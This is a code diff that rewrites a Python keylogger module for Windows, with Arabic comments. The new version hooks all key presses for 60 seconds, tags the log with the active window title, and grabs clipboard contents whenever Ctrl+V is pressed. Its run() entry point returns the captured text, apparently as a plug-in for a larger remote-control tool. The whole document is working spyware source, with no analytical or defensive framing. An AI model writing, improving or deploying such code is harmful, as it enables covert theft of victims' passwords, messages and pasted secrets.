@@ -1,57 +1,34 @@
 import keyboard
-import threading
+import win32gui
+import win32clipboard
 import time
-from ctypes import byref, create_string_buffer, c_ulong, windll
+import threading
 
-# مدة التسجيل بالثواني
-TIMEOUT = 30
-LOG_DATA = ""
+TIMEOUT = 60  # مدة التسجيل بالثواني
 
 class KeyLogger:
     def __init__(self):
+        self.log = ""
         self.current_window = None
 
     def get_current_process(self):
-        # الحصول على مقبض النافذة النشطة
-        hwnd = windll.user32.GetForegroundWindow()
-        pid = c_ulong(0)
-        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
-        process_id = f'{pid.value}'
+        # جلب اسم النافذة الحالية
+        hwnd = win32gui.GetForegroundWindow()
+        window_title = win32gui.GetWindowText(hwnd)
         
-        executable = create_string_buffer(512)
-        h_process = windll.kernel32.OpenProcess(0x400|0x10, False, pid)
-        
-        windll.psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
-        
-        window_title = create_string_buffer(512)
-        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)
-        
-        try:
-            current_title = window_title.value.decode()
-        except UnicodeDecodeError:
-            current_title = "Unknown Window"
-        
-        windll.kernel32.CloseHandle(hwnd)
-        windll.kernel32.CloseHandle(h_process)
-        return process_id, executable.value.decode(), current_title
+        if window_title != self.current_window:
+            self.current_window = window_title
+            self.log += f'\n[Window: {window_title}]\n'
 
     def callback(self, event):
-        global LOG_DATA
-        # عند رفع الإصبع عن الزر
-        if event.event_type == keyboard.KEY_UP:
-            pid, exe, title = self.get_current_process()
+        # دالة يتم استدعاؤها عند ضغط أي زر
+        if event.event_type == keyboard.KEY_DOWN:
+            self.get_current_process()
             
-            # إذا تغيرت النافذة، نسجل العنوان الجديد
-            if self.current_window != title:
-                self.current_window = title
-                header = f'\n[ PID: {pid} - {exe} - {title} ]\n'
-                print(header)
-                LOG_DATA += header
-
-            # تسجيل الزر المضغوط
             name = event.name
+            
+            # معالجة الأزرار الخاصة
             if len(name) > 1:
-                # للأزرار الخاصة مثل space, enter
                 if name == "space":
                     name = " "
                 elif name == "enter":
@@ -59,23 +36,34 @@ class KeyLogger:
                 elif name == "decimal":
                     name = "."
                 else:
+                    name = name.replace(" ", "_")
                     name = f"[{name.upper()}]"
             
-            print(name, end='', flush=True)
-            LOG_DATA += name
+            self.log += name
+
+            # ميزة النسخ واللصق (Detect Paste)
+            if name == 'v' and keyboard.is_pressed('ctrl'):
+                try:
+                    win32clipboard.OpenClipboard()
+                    value = win32clipboard.GetClipboardData()
+                    win32clipboard.CloseClipboard()
+                    self.log += f'\n[PASTE] - {value}\n'
+                except:
+                    pass
 
 def run(**args):
-    global LOG_DATA
-    LOG_DATA = ""
     kl = KeyLogger()
-    
-    # بدء تسجيل المفاتيح
+    # بدء تسجيل الضربات
     hook = keyboard.hook(kl.callback)
     
-    # الانتظار لمدة معينة (TIMEOUT)
+    # الانتظار لمدة محددة (60 ثانية)
     time.sleep(TIMEOUT)
     
     # إيقاف التسجيل
     keyboard.unhook_all()
     
-    return LOG_DATA
+    return kl.log
+
+if __name__ == '__main__':
+    # للتجربة المحلية
+    print(run())
